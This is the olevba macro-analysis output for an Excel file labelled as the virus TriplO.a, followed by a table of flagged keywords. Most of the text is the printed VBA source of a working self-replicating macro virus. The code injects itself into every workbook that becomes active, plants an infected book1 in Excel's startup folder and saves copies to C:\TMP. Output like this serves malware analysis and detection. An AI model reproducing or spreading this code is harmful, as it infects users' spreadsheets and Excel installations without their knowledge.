olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.TriplO.a-d7020f4ea0bb6a6e041415f96333cf5c6214e2cf
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.TriplO.a-d7020f4ea0bb6a6e041415f96333cf5c6214e2cf - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'OOO
Private Sub Workbook_BeforeSave(ByVal SaveAsUI As Boolean, Cancel As Boolean)
    If UCase(ThisWorkbook.Name) = "book1" Then
        Application.Dialogs(xlDialogSaveAs).Show
        'Cancel = True
    End If
End Sub
Private Sub Workbook_Deactivate()
    On Error Resume Next
    Set w1 = ThisWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    Set w2 = ActiveWorkbook.VBProject.VBComponents("ThisWorkbook").CodeModule
    If w2.Lines(1, 1) <> "'OOO" Then
        w2.InsertLines 1, w1.Lines(1, w1.CountOfLines)
    End If
    
    If UCase(Dir(Application.StartupPath + "\book1.")) <> "book1" Then
            Set xlApp = CreateObject("Excel.Application")
            Set xlWB = xlApp.Workbooks.Add
            Set xlWS = xlWB.Sheets.Add
            Set xlCM = xlWB.VBProject.VBComponents("ThisWorkbook").CodeModule
            xlCM.InsertLines 1, w1.Lines(1, w1.CountOfLines)
            xlWB.SaveAs Filename:=Application.StartupPath + "\book1.", FileFormat:=xlNormal, AddToMru:=False
            xlWB.Close
            xlApp.Quit
        End If
End Sub
Private Sub Workbook_BeforeClose(Cancel As Boolean)
    On Error Resume Next
    TmpDir = "C:\TMP\"
    If Trim(Dir(TmpDir)) = "" Then
        MkDir TmpDir
    End If
    oldname = ThisWorkbook.Name
    mFileName = "C:\TMP\" + oldname
    ThisWorkbook.SaveCopyAs Filename:=mFileName
End Sub
Sub vtShowRow()
    Application.Selection.EntireRow.Hidden = False
End Sub
Sub vtHideCol()
    Application.Selection.EntireColumn.Hidden = True
End Sub
Sub vtShowCol()
    Application.Selection.EntireColumn.Hidden = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO Sheet1.cls 
in file: Virus.MSExcel.TriplO.a-d7020f4ea0bb6a6e041415f96333cf5c6214e2cf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.TriplO.a-d7020f4ea0bb6a6e041415f96333cf5c6214e2cf - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     18 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  WH ADDRES
' 0085     27 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Airtel Scrap Detai
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_BeforeClose|Runs when the Excel Workbook is closed       |
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

